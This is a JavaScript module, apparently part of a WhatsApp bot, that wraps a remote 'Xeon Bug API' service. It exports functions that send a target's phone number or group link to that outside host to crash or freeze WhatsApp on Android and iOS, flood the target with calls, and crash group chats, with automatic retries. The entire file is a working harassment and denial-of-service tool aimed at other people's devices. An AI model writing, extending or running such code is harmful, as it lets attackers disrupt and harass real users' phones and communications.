// lib/xeon.js
// Xeon Bug API wrapper — by Dream Guy Xeon
// Endpoints: freezeDroid, callSpam, iosCrash, crashGroup

const axios = require('axios');

const CONFIG = {
    BASE_URL: 'https://xeon-bug-api.onrender.com',
    TIMEOUT: 60000,            // 60s — Xeon API slow ho sakta hai
    RETRY: 2,                  // 2 baar retry
    RETRY_DELAY: 5000
};

// ═══════════════════════════════════════════
//  CORE REQUEST
// ═══════════════════════════════════════════
async function xeonRequest(endpoint, params) {
    const url = `${CONFIG.BASE_URL}${endpoint}`;
    let lastErr = null;

    for (let attempt = 0; attempt <= CONFIG.RETRY; attempt++) {
        try {
            const res = await axios.get(url, {
                params,
                timeout: CONFIG.TIMEOUT,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10)',
                    'Accept': 'application/json'
                }
            });
            return { ok: true, status: res.status, data: res.data };
        } catch (err) {
            lastErr = err;
            // don't retry on 4xx
            if (err.response && err.response.status >= 400 && err.response.status < 500) {
                return {
                    ok: false,
                    status: err.response.status,
                    error: err.response.data?.error || err.message
                };
            }
            if (attempt < CONFIG.RETRY) {
                await new Promise(r => setTimeout(r, CONFIG.RETRY_DELAY));
            }
        }
    }

    return {
        ok: false,
        status: 0,
        error: lastErr?.message || 'unknown error'
    };
}

// ═══════════════════════════════════════════
//  ENDPOINT WRAPPERS
// ═══════════════════════════════════════════

/** Android WhatsApp delay/crash */
async function freezeDroid(number) {
    const clean = String(number).replace(/[^0-9]/g, '');
    return xeonRequest('/freezeDroid', { target: clean });
}

/** Call flood */
async function callSpam(number) {
    const clean = String(number).replace(/[^0-9]/g, '');
    return xeonRequest('/callSpam', { target: clean });
}

/** iOS WhatsApp crash */
async function iosCrash(number) {
    const clean = String(number).replace(/[^0-9]/g, '');
    return xeonRequest('/iosCrash', { target: clean });
}

/** Group chat crash */
async function crashGroup(groupLink) {
    return xeonRequest('/crashGroup', { target: groupLink });
}

// ═══════════════════════════════════════════
//  HEALTH CHECK
// ═══════════════════════════════════════════
async function checkApiHealth() {
    try {
        const res = await axios.get(CONFIG.BASE_URL, { timeout: 10000 });
        return { ok: true, status: res.status };
    } catch (err) {
        // onrender free tier cold start ho sakta hai — 502 bhi chalega
        return { ok: false, error: err.message };
    }
}

module.exports = {
    freezeDroid,
    callSpam,
    iosCrash,
    crashGroup,
    checkApiHealth,
    CONFIG
};